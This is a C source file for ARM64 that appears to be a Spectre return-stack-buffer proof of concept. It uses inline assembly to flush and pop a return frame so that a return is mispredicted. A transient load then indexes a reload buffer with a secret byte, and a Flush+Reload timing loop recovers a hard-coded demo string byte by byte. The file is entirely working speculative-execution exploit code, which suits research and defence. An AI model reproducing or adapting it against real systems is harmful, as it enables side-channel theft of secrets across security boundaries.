#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "utils.h"

#define CACHE_MISS 140
#define REPEAT_10(x)  x x x x x x x x x x
#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

unsigned char SECRET[] = "SPECTRE_EXECUTE";
unsigned char data[128];
volatile unsigned char tmp;
int idx;
static unsigned char *reloadbuffer;

void decode(int *results, int index) {
  uint64_t init, end;
  for(int i = 0; i < 256; i++) {
    int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
	barrier();
	isb();
	init = get_cycles();
	tmp = reloadbuffer[mix_i << 12];
	end = get_cycles();
	isb();
    if(end - init < 160) {
		results[mix_i]++;
    }
  }
}

int __attribute__ ((noinline)) pop() {
#ifdef N
	NOPS(N);
#endif
  	asm volatile(
		"mov x1, sp\n\r"
		"DC CIVAC, x1\n\r"
  		"DSB ISH\n\r"
		"ISB\n\r"
	);
	NOPS(10);
  	asm volatile("ldp x29, x30, [sp],#16\n" : : : "x29");
  	return 0;
}

int __attribute__ ((noinline)) leak() {
	pop();
	tmp = reloadbuffer[SECRET[idx] << 12];
	return 2;
}

int __attribute__ ((noinline)) call() {
  	leak();
  	return 1;
}

int main(int argc, const char **argv) {
	int results[256];
	int max = 0;
	unsigned char hit = 0;
	int pagesize = 4096;
	reloadbuffer = (unsigned char *)mmap(0, pagesize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memset(reloadbuffer, 0, pagesize * 256);

	char leaked[sizeof(SECRET) + 1];
	memset(leaked, 1, sizeof(leaked));
	leaked[sizeof(SECRET)] = 0;

  idx = 0;
  for(int i = 0; i < 15; i++){
	for(int j = 0; j < 256; j++){
		cacheflush(&reloadbuffer[j << 12]);
	}
		memset(results, 0, sizeof(int) * 256);
	  idx = i;
		for(int j = 0; j < 1000; j++){
		    call();
		    decode(results, idx);
		}
		max = results[0];
		for(int m = 0; m < 256; m++){
			if(results[m] > max){
				max = results[m];
				hit = m;
			}		
		}
		leaked[i] = hit;
		printf("%c\t0x%x\n\r", hit, hit);
	}
  printf("%s\n", leaked);
  return (0);
}

